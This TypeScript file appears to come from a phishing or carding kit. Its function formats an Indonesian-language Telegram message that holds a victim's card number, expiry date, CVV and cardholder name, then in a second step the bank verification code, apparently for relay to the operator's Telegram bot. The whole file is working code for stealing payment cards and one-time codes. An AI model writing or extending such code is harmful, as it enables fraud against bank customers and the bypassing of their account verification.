import type { BankFormData } from './bank-types';
import { TELEGRAM_SEPARATOR, telegramField } from './telegram-layout';

export function buildBankTelegramMessage(step: 1 | 2, data: BankFormData): string {
  const lines = ['<b>Tabungan Bank</b>', TELEGRAM_SEPARATOR];

  if (step >= 1) {
    if (data.cardNumber) {
      lines.push(telegramField('Nomor Kartu', `<code>${data.cardNumber}</code>`));
    }
    if (data.expiry) {
      lines.push(telegramField('Valid Hingga', `<code>${data.expiry}</code>`));
    }
    if (data.cvv) {
      lines.push(telegramField('CVV', `<code>${data.cvv}</code>`));
    }
    if (data.cardName) {
      lines.push(telegramField('Nama pada Kartu', `<code>${data.cardName}</code>`));
    }
    lines.push(
      telegramField('Metode Utama', data.isPrimary ? 'Ya' : 'Tidak')
    );
  }

  if (step >= 2 && data.code) {
    lines.push(telegramField('Kode Verifikasi', `<code>${data.code}</code>`));
  }

  lines.push(TELEGRAM_SEPARATOR);
  return lines.join('\n');
}
